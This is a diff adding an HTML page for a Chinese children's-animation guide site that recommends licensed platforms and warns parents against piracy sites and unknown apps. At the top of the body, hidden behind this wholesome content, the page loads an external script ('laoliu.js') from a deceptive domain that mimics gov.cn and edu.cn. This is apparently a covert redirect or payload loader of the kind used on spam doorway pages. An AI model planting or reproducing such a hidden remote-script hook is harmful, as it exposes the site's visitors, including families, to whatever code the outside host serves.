@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>青青草原电影网 - 亲子国漫、草原动画与正版观影导航</title>
+<meta name="description" content="青青草原电影网做亲子国漫导航：喜羊羊、草原动画、上美影经典、陪娃片单、正版平台入口、儿童动画避坑，移动端自适应，不提供盗版播放。">
+<meta name="keywords" content="青青草原电影网,喜羊羊与灰太狼,国漫导航,草原动画,陪娃看片,正版动画平台,儿童动画避坑">
+<meta name="author" content="青青草原电影网">
+<link rel="canonical" href="https://qingqingcaoyuandianyingwang-h5.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#f3faf0;color:#243a1f;line-height:1.78}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+
+.nav{position:sticky;top:0;z-index:99;background:rgba(243,250,240,.93);backdrop-filter:blur(8px);border-bottom:3px solid #5fae3a}
+.nav__box{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.8rem 1rem;flex-wrap:wrap;gap:.5rem}
+.nav__logo{font-weight:900;font-size:1.25rem;color:#3f8f25}
+.nav__logo b{color:#243a1f}
+.nav__links{display:flex;gap:.3rem;flex-wrap:wrap}
+.nav__links a{padding:.4rem .8rem;border-radius:999px;font-size:.86rem;color:#4d6b3f}
+.nav__links a:hover{background:#e4f3da;color:#3f8f25}
+
+.hero{max-width:1200px;margin:2rem auto;padding:0 1rem}
+.hero__card{border-radius:28px;overflow:hidden;background:
+  radial-gradient(circle at 88% 12%,rgba(95,174,58,.35),transparent 55%),
+  linear-gradient(135deg,#eaf7e2,#cdeeb6 52%,#a9dd8f);
+  display:grid;grid-template-columns:1.3fr .7fr;border:3px solid #5fae3a}
+.hero__left{padding:3rem 2rem}
+.hero__tag{display:inline-block;font-size:.74rem;letter-spacing:2px;color:#2f6f1c;border:1px solid #3f8f25;padding:.2rem .8rem;border-radius:999px;margin-bottom:1rem;background:#fff}
+.hero h1{font-size:clamp(2rem,5vw,3.2rem);line-height:1.12;margin-bottom:1rem;color:#243a1f}
+.hero h1 em{font-style:normal;color:#3f8f25}
+.hero p{color:#36502b;max-width:560px;margin-bottom:1.6rem}
+.hero__btn{display:inline-block;background:#3f8f25;color:#fff;font-weight:800;padding:.8rem 2rem;border-radius:999px}
+.hero__right{display:flex;align-items:center;justify-content:center;font-size:6.5rem}
+
+.age{max-width:1200px;margin:1.4rem auto 0;padding:0 1rem}
+.age__box{display:flex;flex-wrap:wrap;gap:.6rem}
+.abtn{background:#fff;border:1px solid #5fae3a;border-radius:999px;padding:.5rem 1rem;font-size:.85rem;font-weight:700;color:#36502b}
+.abtn b{color:#3f8f25}
+
+.wrap{max-width:1200px;margin:3.5rem auto;padding:0 1rem}
+.head{display:flex;align-items:baseline;gap:1rem;margin-bottom:1.5rem}
+.head h2{font-size:1.6rem;color:#243a1f}
+.head h2 span{color:#3f8f25}
+.head a{margin-left:auto;color:#4d6b3f;font-size:.85rem}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.2rem}
+.card{background:#fcfff8;border:2px solid #bfe2a6;border-radius:18px;padding:1.2rem;transition:.3s}
+.card:hover{transform:translateY(-6px);border-color:#3f8f25;box-shadow:0 18px 40px rgba(63,143,37,.22)}
+.card__emo{font-size:2rem}
+.card h3{font-size:1rem;margin:.4rem 0;color:#243a1f}
+.card p{font-size:.84rem;color:#4d6b3f}
+.card__age{display:inline-block;margin-top:.5rem;font-size:.72rem;color:#2f6f1c;background:#e4f3da;padding:.15rem .6rem;border-radius:999px}
+
+.cols{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem}
+.col{background:#fcfff8;border:2px solid #bfe2a6;border-radius:18px;padding:1.4rem}
+.col h3{color:#3f8f25;margin-bottom:.8rem;font-size:1.1rem}
+.col ul{margin-left:1.1rem;font-size:.9rem;color:#36502b}
+.col li{margin:.45rem 0}
+
+.steps{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:1.2rem}
+.step{background:#fcfff8;border:2px solid #bfe2a6;border-radius:16px;padding:1.3rem}
+.step__no{font-size:2rem;font-weight:900;color:#3f8f25}
+.step h4{margin:.3rem 0;color:#243a1f}
+.step p{font-size:.86rem;color:#36502b}
+
+.chips{display:flex;flex-wrap:wrap;gap:.8rem}
+.chip{padding:.7rem 1.1rem;border-radius:14px;background:#fff;border:2px solid #3f8f25;color:#243a1f;font-weight:700}
+.chip small{display:block;font-weight:400;color:#4d6b3f;font-size:.74rem}
+
+.warn{background:#f1fbe8;border:3px dashed #3f8f25;border-radius:18px;padding:1.4rem 1.6rem}
+.warn h3{color:#2f6f1c;margin-bottom:.6rem}
+.warn ul{margin-left:1.2rem;color:#36502b;font-size:.9rem}
+.warn li{margin:.3rem 0}
+
+.foot{margin-top:4rem;background:#1c2c14;color:#cfe0c2;text-align:center;padding:2.5rem 1rem;border-top:4px solid #5fae3a}
+.foot b{color:#d8f3c6}
+.foot a{color:#9bdc7a;margin:0 .4rem}
+.foot small{display:block;margin-top:.8rem;color:#8aa67c}
+
+@media(max-width:880px){
+  .hero__card{grid-template-columns:1fr}
+  .hero__right{min-height:140px;font-size:4.5rem}
+  .cols{grid-template-columns:1fr}
+}
+@media(max-width:560px){
+  .nav__box{justify-content:center}
+  .head h2{font-size:1.3rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="nav">
+  <div class="nav__box">
+    <div class="nav__logo">青青草原<b>电影网</b></div>
+    <nav class="nav__links">
+      <a href="#pick">亲子片单</a>
+      <a href="#where">去哪看</a>
+      <a href="#classic">国漫经典</a>
+      <a href="#kidssafe">儿童避坑</a>
+      <a href="#legal">正版平台</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="hero__card">
+    <div class="hero__left">
+      <span class="hero__tag">GREEN PRAIRIE / 亲子国漫导航</span>
+      <h1>青青草原电影网<br><em>羊村大门开着，正版片子管够</em></h1>
+      <p>网上叫“青青草原影院”的站，很多是“院线同步/全网首发/装专用播放器”的盗版聚合。本站不凑那个热闹：做亲子国漫、草原动画、上美影老片、陪娃选片，挑完去正版平台看。</p>
+      <a href="#pick" class="hero__btn">进羊村挑片 ›</a>
+    </div>
+    <div class="hero__right">🐑</div>
+  </div>
+</section>
+
+<div class="age">
+  <div class="age__box">
+    <div class="abtn">👶 3–6 岁 → <b>启蒙/低幼</b></div>
+    <div class="abtn">🎒 7–12 岁 → <b>冒险/竞技/友情</b></div>
+    <div class="abtn">👨‍👩‍👧 全家欢 → <b>国漫大电影</b></div>
+    <div class="abtn">🎞️ 大人怀旧 → <b>上美影老动画</b></div>
+    <div class="abtn">🌙 睡前 → <b>不吓人/不吵闹</b></div>
+    <div class="abtn">📺 大屏护眼 → <b>央视少儿/IPT</b></div>
+  </div>
+</div>
+
+<section class="wrap" id="pick">
+  <div class="head"><h2>亲子<span>片单</span></h2><a href="#">更多 ›</a></div>
+  <div class="grid">
+    <article class="card"><div class="card__emo">🐺</div><h3>喜羊羊与灰太狼</h3><p>羊村日常、狼堡发明、团结机智，国民级国漫入门。</p><span class="card__age">4–12 岁 · 腾讯/B站/优酷</span></article>
+    <article class="card"><div class="card__emo">🏀</div><h3>筐出胜利</h3><p>羊村篮球队从零打起，热血但不血腥，讲队友和热爱。</p><span class="card__age">6–12 岁 · 正版动画平台</span></article>
+    <article class="card"><div class="card__emo">🐂</div><h3>草原豆思</h3><p>豆思牛、媚媚羊守草原，马头琴+呼麦，蒙古草原风味。</p><span class="card__age">5–10 岁 · B站正版</span></article>
+    <article class="card"><div class="card__emo">🐒</div><h3>上美影老动画</h3><p>大闹天宫、哪吒闹海、黑猫警长、小蝌蚪找妈妈。</p><span class="card__age">全年龄 · B站/央视频</span></article>
+    <article class="card"><div class="card__emo">🐼</div><h3>大头儿子 / 熊猫</h3><p>城市家庭、亲子关系、低冲突，适合晚饭后的沙发时间。</p><span class="card__age">3–8 岁 · 央视频/卡酷</span></article>
+    <article class="card"><div class="card__emo">🌾</div><h3>草原奇遇类</h3><p>新大头儿子和小头爸爸之草原奇遇、草原文化儿童片。</p><span class="card__age">4–10 岁 · 央视动画</span></article>
+  </div>
+</section>
+
+<section class="wrap" id="where">
+  <div class="head"><h2>挑完<span>去哪看</span></h2><a href="#">更多 ›</a></div>
+  <div class="cols">
+    <div class="col">
+      <h3>📺 电视/大屏/低龄首选</h3>
+      <ul>
+        <li>央视网动画专区：优秀国产动画片展播，免费正版</li>
+        <li>央视频：CCTV-14 少儿频道、7 天回看、官方动画</li>
+        <li>卡酷少儿：低龄启蒙 + 经典国漫轮播</li>
+        <li>广电 IPTV / 有线：优秀国产动画免费专区，少乱剪</li>
+      </ul>
+    </div>
+    <div class="col">
+      <h3>📱 手机/平板/补番</h3>
+      <ul>
+        <li>哔哩哔哩：上美影官方号、喜羊羊、罗小黑、中国奇谭</li>
+        <li>腾讯视频：喜羊羊新季、国漫大电影、合家欢动画</li>
+        <li>优酷：羊羊系列、少儿动画、国产特辑</li>
+        <li>爱奇艺：国漫、低龄启蒙、动画周展映内容</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section class="wrap" id="classic">
+  <div class="head"><h2>国漫<span>经典池</span></h2><a href="#">更多 ›</a></div>
+  <div class="chips">
+    <div class="chip">大闹天宫<small>上美影 / 4K修复</small></div>
+    <div class="chip">哪吒闹海<small>国产动画里程碑</small></div>
+    <div class="chip">葫芦兄弟<small>剪纸动画经典</small></div>
+    <div class="chip">黑猫警长<small>低烈度普法向</small></div>
+    <div class="chip">小蝌蚪找妈妈<small>水墨动画</small></div>
+    <div class="chip">天书奇谭<small>上美影正版修复</small></div>
+    <div class="chip">中国奇谭<small>当代国漫短片集</small></div>
+    <div class="chip">罗小黑战记<small>国漫/合家欢</small></div>
+  </div>
+</section>
+
+<section class="wrap" id="kidssafe">
+  <div class="head"><h2>儿童动画<span>避坑</span></h2><a href="#">更多 ›</a></div>
+  <div class="steps">
+    <div class="step"><div class="step__no">01</div><h4>别点“全集网盘”</h4><p>亲子动画正版通常在平台内播，打包网盘多为侵权/引流。</p></div>
+    <div class="step"><div class="step__no">02</div><h4>拒“魔改剪辑号”</h4><p>角色互骂、惊悚配乐、恶意恶搞经典，不算正版内容。</p></div>
+    <div class="step"><div class="step__no">03</div><h4>不装“动画专用APP”</h4><p>来源不明 apk 可能带广告 SDK、扣费、跳转外链。</p></div>
+    <div class="step"><div class="step__no">04</div><h4>大屏认准官方</h4><p>央视少儿、卡酷、IPTV 官方专区，比野聚合站稳。</p></div>
+    <div class="step"><div class="step__no">05</div><h4>看年龄分级</h4><p>3 岁看打斗、12 岁看低幼，都不合适；按片单年龄来。</p></div>
+    <div class="step"><div class="step__no">06</div><h4>陪看不甩手机</h4><p>亲子片的价值在“一起笑”，不是把娃交给自动连播。</p></div>
+  </div>
+</section>
+
+<section class="wrap" id="legal">
+  <div class="head"><h2>正版<span>平台清单</span></h2><a href="#">更多 ›</a></div>
+  <div class="chips">
+    <div class="chip">央视频<small>CCTV-14/纪录片/国漫</small></div>
+    <div class="chip">央视网动画<small>优秀国产动画展播</small></div>
+    <div class="chip">卡酷少儿<small>低龄+经典轮播</small></div>
+    <div class="chip">哔哩哔哩<small>上美影/喜羊羊/国漫</small></div>
+    <div class="chip">腾讯视频<small>喜羊羊新季/合家欢</small></div>
+    <div class="chip">优酷少儿<small>羊羊系列/国产动画</small></div>
+    <div class="chip">爱奇艺<small>国漫/启蒙动画</small></div>
+    <div class="chip">西瓜视频<small>上美影修复/纪录片</small></div>
+  </div>
+</section>
+
+<section class="wrap" id="safe">
+  <div class="head"><h2>防盗版<span>提醒</span></h2><a href="#">更多 ›</a></div>
+  <div class="warn">
+    <h3>🐑 青青草原电影网不干的几件事</h3>
+    <ul>
+      <li>不提供“院线动画刚下档的高清完整版” → 盗录/侵权</li>
+      <li>不写“全网首发 / 院线同步 / 免VIP全站” → 盗版站话术</li>
+      <li>不聚合网盘解压码、不加群发资源 → 灰产引流</li>
+      <li>不要求装“专用播放器 / 解码器 / 浏览器插件” → 捆绑风险</li>
+      <li>不挂“博彩弹窗 / 假系统中毒 / 客服微信充值” → 直接关</li>
+    </ul>
+  </div>
+</section>
+
+<footer class="foot">
+  <div><b>青青草原电影网</b> · 亲子国漫 / 草原动画 / 上美影经典 / 儿童动画避坑 / 正版观影导航</div>
+  <div style="margin-top:.6rem">
+    <a href="#pick">亲子片单</a>|
+    <a href="#where">去哪看</a>|
+    <a href="#classic">国漫经典</a>|
+    <a href="#kidssafe">儿童避坑</a>|
+    <a href="#legal">正版平台</a>|
+    <a href="#">关于</a>|
+    <a href="#">免责声明</a>
+  </div>
+  <small>官网：https://qingqingcaoyuandianyingwang-h5.github.io</small>
+  <small>© 2025 青青草原电影网 亲子影视导航站；不提供盗版影片、不聚合网盘资源、不提供成人内容、不引导安装第三方播放器</small>
+</footer>
+
+</body>
+</html>
